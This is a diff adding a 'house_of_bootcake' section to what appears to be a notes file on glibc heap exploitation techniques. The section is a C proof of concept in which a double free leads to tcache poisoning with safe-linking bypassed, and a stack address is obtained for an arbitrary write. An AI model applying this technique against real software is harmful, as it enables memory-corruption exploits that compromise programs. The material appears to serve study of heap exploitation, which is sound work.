@@ -442,3 +442,35 @@ a = &fake_chunks[2];
 free(a); // tree the fake chunk from stack into the tcache
 void *b = malloc(0x30); // get the stack address
 ```
+## house_of_bootcake
+```c
+    intptr_t stack_var[4];
+    intptr_t *x[7];
+
+    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
+        x[i] = malloc(0x100);
+    }
+
+    intptr_t *prev = malloc(0x100);
+    intptr_t *a = malloc(0x100); //victim
+    malloc(0x10); //just padding
+
+    // fill tcache
+    for(int i=0; i<7; i++){
+        free(x[i]);
+    }
+
+    free(a); //to smallbin
+    free(prev); //merge (consolidate with a/victim)
+    malloc(0x100); //remove one chunk from tcache
+    /*VULNERABILITY*/
+    free(a);// a (victim) is already freed
+    /*VULNERABILITY*/
+    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10); // get merged chunk a and prev
+    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^ (long)stack_var; // tcache poisoning, a->fd = stack_var
+
+    a = malloc(0x100); // head points to stack_var
+    intptr_t *target = malloc(0x100); // stack address allocated
+    target[0] = 0xcafebabe;
+    assert(stack_var[0] == 0xcafebabe);
+```
